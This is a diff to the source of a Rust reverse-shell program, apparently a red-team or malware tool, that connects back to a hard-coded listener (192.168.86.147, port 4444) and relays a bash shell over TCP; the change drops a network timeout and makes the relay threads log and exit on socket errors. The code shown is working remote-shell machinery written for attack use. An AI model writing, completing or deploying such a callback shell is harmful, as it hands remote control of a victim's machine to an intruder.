@@ -23,15 +23,9 @@ const LHOST: &str = "192.168.86.147";
 const LPORT: &str = "4444";
 const SHELL_TYPE: &str = "bash";
 const RETRY_DELAY_MS: u64 = 2_000;
-const NETWORK_TIMEOUT_MS: u64 = 10_000;
 
 fn handle_network_connection(stream: TcpStream) {
     debug!("Connected to {}", stream.peer_addr().unwrap());
-
-    debug!("Setting read/write timeout...");
-    let timeout: Option<Duration> = Some(Duration::from_millis(NETWORK_TIMEOUT_MS));
-    stream.set_read_timeout(timeout).unwrap();
-    stream.set_write_timeout(timeout).unwrap();
 
     debug!("Cloned stream for use with channels.");
     let cloned_stream = stream.try_clone().expect("Failed to clone TCP stream");
@@ -72,7 +66,10 @@ fn spawn_net_reader_thread(mut stream: TcpStream, net_tx: Sender<Vec<u8>>) -> Jo
                     error!("Stream error: {}", e);
                     break;
                 },
-                Err(_) => {}
+                Err(e) => {
+                    error!("Failed to call take_error on TcpStream: {}", e);
+                    break;
+                }
             }
 
             match stream.read(&mut buffer) {
@@ -108,7 +105,10 @@ fn spawn_shell_reader_thread(mut stream: TcpStream, shell_rx: Receiver<Vec<u8>>)
                     error!("Stream error: {}", e);
                     break;
                 },
-                Err(_) => {}
+                Err(e) => {
+                    error!("Failed to call take_error on TcpStream: {}", e);
+                    break;
+                }
             }
 
             match shell_rx.recv() {
